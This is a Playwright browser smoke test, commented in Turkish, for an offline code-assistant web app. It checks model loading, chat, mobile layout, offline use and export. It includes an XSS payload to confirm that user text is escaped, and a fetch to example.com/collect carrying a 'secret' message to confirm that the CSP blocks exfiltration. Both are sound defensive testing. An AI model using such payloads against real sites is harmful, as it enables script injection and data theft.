#!/usr/bin/env node
/* Gerçek tarayıcı duman testi (isteğe bağlı).
 *
 * Statik sunucuyu GitHub Pages alt yolu taklidiyle başlatır, Chromium'da
 * gerçek model indirme/doğrulama, sohbet, kalıcılık, alt yol, çevrimdışı PWA,
 * mobil çekmece ve dış ağ engelini sınar.
 *
 * Gereksinim: `npm install` ve bir Chromium/Chrome. Yol CHROME_PATH ile
 * verilebilir; yoksa Playwright önbelleği aranır. Tarayıcı bulunamazsa test
 * atlanır (statik/ajan testleri etkilenmez).
 */

import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";
import assert from "node:assert/strict";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const PREFIX = "/AwuGokturk-Web";
const MIME = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".mjs": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".svg": "image/svg+xml",
  ".png": "image/png",
  ".webmanifest": "application/manifest+json",
  ".txt": "text/plain; charset=utf-8",
};

function findChromium() {
  if (process.env.CHROME_PATH && fs.existsSync(process.env.CHROME_PATH)) {
    return process.env.CHROME_PATH;
  }
  const direct = [
    "/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/google-chrome",
    "/usr/bin/google-chrome-stable", "/snap/bin/chromium",
  ];
  for (const file of direct) if (fs.existsSync(file)) return file;

  const bases = [
    path.join(os.homedir(), ".cache", "ms-playwright"),
    path.join(os.homedir(), "Library", "Caches", "ms-playwright"),
  ];
  for (const base of bases) {
    if (!fs.existsSync(base)) continue;
    for (const dir of fs.readdirSync(base)) {
      if (!dir.startsWith("chromium")) continue;
      const candidates = [
        path.join(base, dir, "chrome-linux64", "chrome"),
        path.join(base, dir, "chrome-linux", "chrome"),
        path.join(base, dir, "chrome-mac", "Chromium.app", "Contents", "MacOS", "Chromium"),
      ];
      for (const file of candidates) if (fs.existsSync(file)) return file;
    }
  }
  return null;
}

function startServer() {
  const server = http.createServer((req, res) => {
    let urlPath;
    try { urlPath = decodeURIComponent(new URL(req.url, "http://localhost").pathname); }
    catch { res.writeHead(400); res.end("Bad request"); return; }

    if (urlPath === PREFIX) {
      res.writeHead(302, { Location: PREFIX + "/" });
      res.end();
      return;
    }
    if (!urlPath.startsWith(PREFIX + "/")) {
      res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
      res.end("Yalnızca " + PREFIX + "/ alt yolu test edilir.");
      return;
    }
    let rel = urlPath.slice(PREFIX.length + 1) || "index.html";
    if (rel.endsWith("/")) rel += "index.html";
    const file = path.resolve(ROOT, rel);
    if (!file.startsWith(ROOT + path.sep)) {
      res.writeHead(403); res.end("Forbidden"); return;
    }
    let stat;
    try { stat = fs.statSync(file); } catch {
      res.writeHead(404, { "Content-Type": "text/plain; charset=utf-8" });
      res.end("Not found");
      return;
    }
    if (!stat.isFile()) {
      res.writeHead(404); res.end("Not found"); return;
    }
    const headers = {
      "Content-Type": MIME[path.extname(file)] || "application/octet-stream",
      "Content-Length": stat.size,
      "Cache-Control": "no-cache",
      "Service-Worker-Allowed": PREFIX + "/",
    };
    res.writeHead(200, headers);
    if (req.method === "HEAD") { res.end(); return; }
    fs.createReadStream(file).pipe(res);
  });
  return new Promise((resolve) => {
    server.listen(0, "127.0.0.1", () => resolve({
      server, port: server.address().port,
    }));
  });
}

async function main() {
  const chrome = findChromium();
  if (!chrome) {
    console.log("ATLANDI: Chromium/Chrome bulunamadı. CHROME_PATH ortam değişkeni verin.");
    return;
  }

  let chromium;
  try {
    ({ chromium } = await import("playwright-core"));
  } catch {
    console.log("ATLANDI: playwright-core kurulu değil. `npm install` çalıştırın.");
    return;
  }

  const { server, port } = await startServer();
  const base = `http://127.0.0.1:${port}${PREFIX}/`;
  const browser = await chromium.launch({
    executablePath: chrome,
    headless: true,
    args: ["--no-sandbox", "--disable-dev-shm-usage"],
  });

  const context = await browser.newContext({ viewport: { width: 1360, height: 900 } });
  const page = await context.newPage();
  const errors = [];
  const external = [];
  page.on("pageerror", (err) => errors.push("pageerror: " + err.message));
  page.on("console", (m) => {
    if (m.type() !== "error") return;
    if (m.text().includes("frame-ancestors")) return; // meta ile bilinen sınır
    errors.push("console: " + m.text());
  });
  page.on("request", (r) => {
    if (!r.url().startsWith(`http://127.0.0.1:${port}/`) && !r.url().startsWith("data:")) {
      external.push(r.url());
    }
  });

  const ready = async (timeout = 30000) => {
    await page.waitForFunction(() => {
      const t = document.querySelector("#modelChipText")?.textContent || "";
      return t === "Model hazır" || t === "Model yok" || t === "Model yüklenmedi";
    }, null, { timeout });
    const chip = await page.textContent("#modelChipText");
    assert.equal(chip, "Model hazır", "model hazır değil");
  };

  try {
    await page.goto(base, { waitUntil: "networkidle" });
    await ready();
    assert.equal(await page.textContent("#storageBackend"), "IndexedDB (yerel)");
    assert.ok(await page.evaluate(() => !!navigator.serviceWorker.controller),
      "Service Worker denetleyicisi yok");
    const unnamedButtons = await page.evaluate(() => [...document.querySelectorAll("button")]
      .filter((btn) => !(btn.textContent.trim() || btn.getAttribute("aria-label") || btn.getAttribute("title")))
      .map((btn) => btn.id || btn.className));
    assert.deepEqual(unnamedButtons, [], "erişilebilir adı olmayan düğmeler");
    assert.equal(await page.getAttribute('[data-tab="sohbet"]', "aria-current"), "page");

    // Resmî logo gerçekten yüklendi
    const logo = await page.$eval(".topbar-logo", (img) => ({
      src: img.getAttribute("src"), w: img.naturalWidth, h: img.naturalHeight,
    }));
    assert.match(logo.src, /assets\/awu-gokturk-logo\.jpg$/);
    assert.ok(logo.w > 0 && logo.h > 0, "üst çubuk logosu yüklenmedi");
    const welcomeLogo = await page.$eval(".welcome-logo", (img) => img.naturalWidth);
    assert.ok(welcomeLogo > 0, "karşılama logosu yüklenmedi");
    assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector(".mobile-tabbar")).display),
      "none", "masaüstünde alt gezinme gizli olmalı");

    // Gerçek 5K çıkarımı
    await page.click("#modelChip");
    await page.fill("#modelTestInput", "Arduino Uno'da 7. pindeki LED'i 500 ms aralıkla yakıp söndür");
    await page.click("#modelTestBtn");
    await page.waitForSelector("#modelTestResult .prob-row", { timeout: 10000 });
    const prediction = await page.textContent("#modelTestResult .prob-row.top .prob-name");
    assert.ok(["arduino_dijital", "arduino_analog"].includes(prediction),
      "beklenmeyen 5K etiketi: " + prediction);
    const sha = await page.textContent("#modelSha");
    assert.match(sha, /^[0-9a-f]{64}$/);
    await page.keyboard.press("Escape");

    // Kod üretimi + güvenlik uyarısı
    await page.fill("#input", "Arduino Uno'da 7. pindeki LED'i 500 ms aralıkla yakıp söndür.");
    await page.press("#input", "Enter");
    await page.waitForSelector(".message.assistant", { timeout: 20000 });
    await page.waitForTimeout(400);
    const code = await page.textContent(".code-block pre");
    assert.match(code, /const int LED_PIN = 7;/);
    assert.match(code, /INTERVAL_MS = 500/);
    assert.match(await page.textContent(".build-line"), /Statik ön kontrol/);
    assert.match(await page.textContent(".build-line"), /Derleme değil/);
    assert.ok((await page.textContent(".badge-model")).includes("5K ipucu"));
    assert.equal(await page.locator(".history-item").count(), 1);
    const bubbleStyle = await page.$eval(".message.user .bubble", (node) => {
      const style = getComputedStyle(node);
      return { bg: style.backgroundImage, color: style.color, radius: style.borderRadius };
    });
    assert.match(bubbleStyle.bg, /linear-gradient/);
    assert.match(bubbleStyle.radius, /22px/);
    assert.ok(bubbleStyle.color !== "rgb(0, 0, 0)", "kullanıcı balonu okunaksız");

    // Kalıcılık + önbellekten model
    await page.reload({ waitUntil: "networkidle" });
    await ready();
    assert.equal(await page.locator(".message").count(), 2);
    await page.click("#modelChip");
    assert.match(await page.textContent("#modelStatusDetail"), /önbellekten/);
    await page.keyboard.press("Escape");

    // Mobil düzen ve çekmece
    await page.setViewportSize({ width: 390, height: 844 });
    await page.waitForTimeout(250);
    assert.ok(await page.evaluate(() => document.body.scrollWidth <= window.innerWidth),
      "mobil yatay taşma var");
    assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector("#menuBtn")).display),
      "grid");
    assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector(".mobile-tabbar")).display),
      "grid", "mobil alt gezinme görünmüyor");

    // Android alt sekmeleri: Kod composer'a odaklanır, Ayarlar diyaloğu açar.
    await page.click('[data-tab="kod"]');
    assert.match(await page.getAttribute("#input", "placeholder"), /Kod isteğinizi yazın/);
    assert.equal(await page.getAttribute('[data-tab="kod"]', "aria-current"), "page");
    await page.click('[data-tab="sohbet"]');
    assert.equal(await page.getAttribute('[data-tab="sohbet"]', "aria-current"), "page");
    assert.equal(await page.getAttribute("#input", "placeholder"), "Mesajınızı yazın…");
    await page.click('[data-tab="ayarlar"]');
    assert.ok(await page.evaluate(() => document.querySelector("#settingsDialog").open));
    await page.keyboard.press("Escape");
    assert.ok(!(await page.evaluate(() => document.querySelector("#settingsDialog").open)));

    await page.click("#menuBtn");
    assert.ok(await page.evaluate(() => document.querySelector("#sidebar").classList.contains("open")));
    assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector("#sidebar")).borderTopLeftRadius),
      "24px", "mobil geçmiş alt sayfa olmalı");
    await page.keyboard.press("Escape");
    assert.ok(!(await page.evaluate(() => document.querySelector("#sidebar").classList.contains("open"))));

    // Tablet düzeni: alt gezinme görünür, yatay taşma yok, logo yüklü.
    await page.setViewportSize({ width: 834, height: 1112 });
    await page.waitForTimeout(250);
    assert.ok(await page.evaluate(() => document.body.scrollWidth <= window.innerWidth),
      "tablet yatay taşma var");
    assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector(".mobile-tabbar")).display),
      "grid", "tablet alt gezinmesi görünmüyor");
    assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector("#sidebar")).position),
      "fixed", "tablet geçmiş paneli sabit değil");
    assert.ok(await page.$eval(".topbar-logo", (img) => img.naturalWidth > 0));

    // Çok dar telefon: taşma yok, model durumu nokta olarak erişilebilir kalır.
    await page.setViewportSize({ width: 320, height: 568 });
    await page.waitForTimeout(250);
    assert.ok(await page.evaluate(() => document.body.scrollWidth <= window.innerWidth),
      "320 px ekranda yatay taşma var");
    assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector(".mobile-tabbar")).display),
      "grid", "320 px alt gezinmesi görünmüyor");
    assert.ok((await page.$eval(".model-chip", (node) => node.getBoundingClientRect().width)) <= 36);
    assert.match(await page.getAttribute("#modelChip", "aria-label"), /^Yerel model: Model hazır/);

    // Kullanıcı metni HTML olarak çalıştırılmaz
    await page.fill("#input", '<img src=x onerror="window.__xss=1"><script>window.__xss=2</script>');
    await page.press("#input", "Enter");
    await page.waitForFunction(() => document.querySelectorAll(".message").length >= 4, null, { timeout: 20000 });
    assert.equal(await page.evaluate(() => window.__xss), undefined);
    assert.equal(await page.locator('img[src="x"]').count(), 0);
    assert.ok((await page.locator(".message.user .bubble").last().textContent()).includes("<img"));

    // Dışa aktarma gerçekten indirilebilir
    await page.setViewportSize({ width: 1360, height: 900 });
    await page.click("#settingsBtn");
    const [download] = await Promise.all([
      page.waitForEvent("download", { timeout: 10000 }),
      page.click("#exportBtn"),
    ]);
    const downloadPath = await download.path();
    const payload = JSON.parse(fs.readFileSync(downloadPath, "utf8"));
    assert.equal(payload.app, "AwuGöktürk Web");
    assert.ok(Array.isArray(payload.sessions) && payload.sessions.length >= 1);
    await page.keyboard.press("Escape");

    // Dış ağ CSP tarafından engellenir
    const blocked = await page.evaluate(async () => {
      try { await fetch("https://example.com/collect?msg=gizli"); return "ALLOWED"; }
      catch (e) { return "BLOCKED"; }
    });
    assert.equal(blocked, "BLOCKED", "CSP harici fetch'i engellemedi");
    errors.splice(0, errors.length, ...errors.filter((e) =>
      !/Content Security Policy|Failed to fetch/i.test(e)));

    // Çevrimdışı yeniden yükleme + model + sohbet
    await context.setOffline(true);
    await page.reload({ waitUntil: "domcontentloaded" });
    await ready();
    assert.equal(await page.textContent("#netChipText"), "Çevrimdışı");
    assert.ok(await page.$eval(".topbar-logo", (img) => img.naturalWidth > 0),
      "logo çevrimdışı önbellekten yüklenmedi");
    assert.match(await page.textContent("#modelStatusDetail"), /önbellekten/);
    await page.fill("#input", "ESP32'de GPIO 18'deki LED'i 1 saniye aralıkla yakıp söndür.");
    await page.press("#input", "Enter");
    await page.waitForFunction(() => {
      const nodes = document.querySelectorAll(".message.assistant .code-block pre");
      return nodes.length > 0 && nodes[nodes.length - 1].innerText.includes("18");
    }, null, { timeout: 20000 });
    assert.match(await page.locator(".code-block pre").last().innerText(), /const int LED_PIN = 18;/);

    assert.deepEqual(external, [], "harici ağ isteği: " + external.join(", "));
    assert.deepEqual(errors, [], "tarayıcı hataları: " + errors.join("\n"));
    console.log("TARAYICI TESTİ GEÇTİ: Android arayüzü, resmî logo, alt yol, gerçek model, sohbet, kalıcılık, mobil/tablet, XSS, dışa aktarma, CSP, çevrimdışı.");
  } finally {
    await context.setOffline(false).catch(() => {});
    await browser.close();
    server.close();
  }
}

main().catch((err) => {
  console.error("TARAYICI TESTİ BAŞARISIZ:", err);
  process.exitCode = 1;
});
